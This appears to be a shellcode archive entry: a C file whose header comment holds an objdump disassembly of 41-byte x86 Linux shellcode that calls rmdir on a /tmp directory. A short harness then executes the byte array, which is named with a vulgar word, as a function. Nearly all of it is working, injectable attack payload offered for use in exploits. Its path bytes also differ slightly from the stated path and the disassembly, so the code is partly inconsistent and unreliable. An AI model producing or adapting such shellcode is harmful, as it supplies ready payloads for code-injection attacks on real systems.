/*
Name   : 41 bytes sys_rmdir("/tmp/willdeleted") x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian


root@localhost:/home/gunslinger/shellcode# objdump -d rmdir

rmdir:     file format elf32-i386

Disassembly of section .text:

08048060 <.text>:
 8048060:	eb 11                	jmp    0x8048073
 8048062:	31 c0                	xor    %eax,%eax
 8048064:	b0 28                	mov    $0x28,%al
 8048066:	31 db                	xor    %ebx,%ebx
 8048068:	5b                   	pop    %ebx
 8048069:	cd 80                	int    $0x80
 804806b:	31 c0                	xor    %eax,%eax
 804806d:	b0 01                	mov    $0x1,%al
 804806f:	31 db                	xor    %ebx,%ebx
 8048071:	cd 80                	int    $0x80
 8048073:	e8 ea ff ff ff       	call   0x8048062
 8048078:	2f                   	das
 8048079:	74 6d                	je     0x80480e8
 804807b:	70 2f                	jo     0x80480ac
 804807d:	77 69                	ja     0x80480e8
 804807f:	6c                   	insb   (%dx),%es:(%edi)
 8048080:	6c                   	insb   (%dx),%es:(%edi)
 8048081:	64                   	fs
 8048082:	65                   	gs
 8048083:	6c                   	insb   (%dx),%es:(%edi)
 8048084:	65                   	gs
 8048085:	74 65                	je     0x80480ec
 8048087:	64                   	fs
root@localhost:/home/gunslinger/shellcode#
*/

#include <stdio.h>

char pussy[] =  "\xeb\x11\x31\xc0\xb0\x28\x31"
		"\xdb\x5b\xcd\x80\x31\xc0\xb0"
		"\x01\x31\xdb\xcd\x80\xe8\xea"
		"\xff\xff\xff\x2f\x74\x6d\x70"
		"\x2f\x77\x69\x6c\x6c\x64\x65"
		"\x6c\x74\x65\x74\x65\x64";

int main(void)
{
	(*(void(*)()) pussy)();

return 0;
}